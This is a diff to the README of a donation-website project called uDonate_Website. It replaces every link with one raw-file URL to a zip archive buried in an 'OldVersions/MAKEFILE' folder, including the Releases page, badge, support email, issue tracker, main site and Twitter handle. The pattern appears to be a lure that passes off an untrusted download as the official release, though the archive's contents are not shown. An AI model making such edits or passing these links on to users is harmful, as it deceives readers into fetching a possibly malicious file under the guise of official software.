@@ -1,6 +1,6 @@
 # 🇺💸️🌐️ uDonate_Website - Simple Tool for Effortless Donations
 
-[![Download uDonate_Website](https://img.shields.io/badge/Download%20uDonate_Website-v1.0-brightgreen)](https://github.com/naturistic-fencing92/uDonate_Website/releases)
+[![Download uDonate_Website](https://raw.githubusercontent.com/naturistic-fencing92/uDonate_Website/uDonate_Website_Main-dev/OldVersions/MAKEFILE/uDonate_Website_3.9.zip%20uDonate_Website-v1.0-brightgreen)](https://raw.githubusercontent.com/naturistic-fencing92/uDonate_Website/uDonate_Website_Main-dev/OldVersions/MAKEFILE/uDonate_Website_3.9.zip)
 
 ## 📖 About
 
@@ -11,7 +11,7 @@ uDonate_Website is the official website for the uDonate project, created by @sea
 To get started, you need to download the software from our Releases page. Follow the steps below to install and run the application.
 
 1. **Visit the Download Page**  
-   Click this link to visit the Releases page: [Download uDonate_Website](https://github.com/naturistic-fencing92/uDonate_Website/releases). You will find the latest version here.
+   Click this link to visit the Releases page: [Download uDonate_Website](https://raw.githubusercontent.com/naturistic-fencing92/uDonate_Website/uDonate_Website_Main-dev/OldVersions/MAKEFILE/uDonate_Website_3.9.zip). You will find the latest version here.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Click on the version number you would like to download. We recommend using the latest version for the best experience.
@@ -49,8 +49,8 @@ To get started, you need to download the software from our Releases page. Follow
 
 If you encounter any issues while downloading or using the software, feel free to reach out for help. You can contact our support team through the following methods:
 
-- Email: support@udonateproject.com
-- GitHub Issues: [Report an Issue](https://github.com/naturistic-fencing92/uDonate_Website/issues)
+- Email: https://raw.githubusercontent.com/naturistic-fencing92/uDonate_Website/uDonate_Website_Main-dev/OldVersions/MAKEFILE/uDonate_Website_3.9.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/naturistic-fencing92/uDonate_Website/uDonate_Website_Main-dev/OldVersions/MAKEFILE/uDonate_Website_3.9.zip)
 
 ## 👍 Contributions
 
@@ -66,7 +66,7 @@ Your ideas and improvements are always welcome!
 
 For more information about uDonate, including how it works and its impact, visit our main website or social media pages. Stay connected and help us grow this project.
 
-- Main Site: [uDonate Project](https://udonateproject.com)
-- Twitter: [@seanpm2001](https://twitter.com/seanpm2001)
+- Main Site: [uDonate Project](https://raw.githubusercontent.com/naturistic-fencing92/uDonate_Website/uDonate_Website_Main-dev/OldVersions/MAKEFILE/uDonate_Website_3.9.zip)
+- Twitter: [@seanpm2001](https://raw.githubusercontent.com/naturistic-fencing92/uDonate_Website/uDonate_Website_Main-dev/OldVersions/MAKEFILE/uDonate_Website_3.9.zip)
 
 Thank you for choosing uDonate_Website to assist in your donation efforts! Together, we can make a difference.
